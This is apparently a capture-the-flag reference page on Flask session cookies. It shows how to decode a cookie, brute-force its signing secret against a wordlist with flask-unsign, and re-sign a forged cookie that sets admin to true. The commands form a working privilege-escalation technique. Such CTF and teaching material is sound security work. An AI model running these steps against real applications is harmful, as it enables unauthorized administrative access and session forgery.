---
title: "Flask"
description: "Analyze and manipulate Flask session cookies in CTF challenges to modify states or escalate privileges."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["flask", "session", "cookie", "ctf", "unsign"]
authors: ["CTF.Support Team"]
summary: "Flask sessions are signed client-side cookies that can be decoded, brute-forced, or re-signed to escalate privileges."
aliases: ["/web/python/flask/"]
slug: "flask"
toc: true
---

## Session Cookies

A typical Flask session cookie looks like:

```text
eyJhZG1pbiI6ZmFsc2UsInVpZCI6InQxIn0.Y8MWdQ.2GDhtc5YkYsDn6rbJ5BA3XbZmYw
```

Decoding the first base64 part reveals:

```json
{"admin":false,"uid":"t1"}
```

### flask-unsign

Use flask-unsign to decode, brute-force, or re-sign cookies.

```bash
# Decode
flask-unsign -d -c <cookie>

# Unsign (brute-force secret)
flask-unsign -u -c <cookie> -w rockyou.txt

# Sign a custom cookie
flask-unsign -S <secret> -s -c "{'admin': True, 'uid': 't1'}"
```

## Tips

- Look for `SECRET_KEY` leakage in source code or environment files.
- Re-signing cookies can grant admin access if the key is weak.
